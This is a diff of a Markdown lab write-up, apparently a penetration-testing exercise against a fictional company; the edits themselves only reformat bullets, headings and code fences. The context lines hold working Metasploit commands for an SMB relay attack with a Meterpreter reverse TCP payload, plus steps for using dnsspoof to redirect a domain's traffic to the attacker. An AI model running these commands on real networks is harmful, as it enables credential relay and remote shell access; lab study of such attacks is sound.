@@ -24,9 +24,9 @@ You have been hired by Slytherin Solutions, a mid-sized technology company, to c
 
 **Skills & Techniques Covered**
 
-✅ Performing SMB Relay attacks against patched systems.
-✅ Using dnsspoof to manipulate network traffic and redirect requests.
-✅ Leveraging Metasploit for exploitation and session management.
+* Performing SMB Relay attacks against patched systems.
+* Using dnsspoof to manipulate network traffic and redirect requests.
+* Leveraging Metasploit for exploitation and session management.
 
 **Tools Required**
 
@@ -34,7 +34,7 @@ You have been hired by Slytherin Solutions, a mid-sized technology company, to c
 
 - Metasploit Framework (for SMB relay exploitation)
 
-### SMB Relay Attack Execution
+## SMB Relay Attack Execution
 In this scenario, I launched an SMB Relay Attack to intercept and relay authentication requests from a client machine to a target system, ultimately gaining a Meterpreter shell.
 
 **Attack Flow**
@@ -49,7 +49,8 @@ In this scenario, I launched an SMB Relay Attack to intercept and relay authenti
 **Attack Execution**
 
 Step 1: Start msfconsole and configure the SMB Relay exploit
-''''bash
+
+````bash
 msfconsole
 use exploit/windows/smb/smb_relay
 set SRVHOST 192.168.50.23
@@ -57,7 +58,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 192.168.50.23
 set SMBHOST 192.168.50.4
 exploit
-''''
+````
 
 Step 2: In a new tab, configure dnsspoof in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain: slytherin.com. Create a file with fake dns entry with all subdomains of
 slytherin.com pointing to our attacker machine.
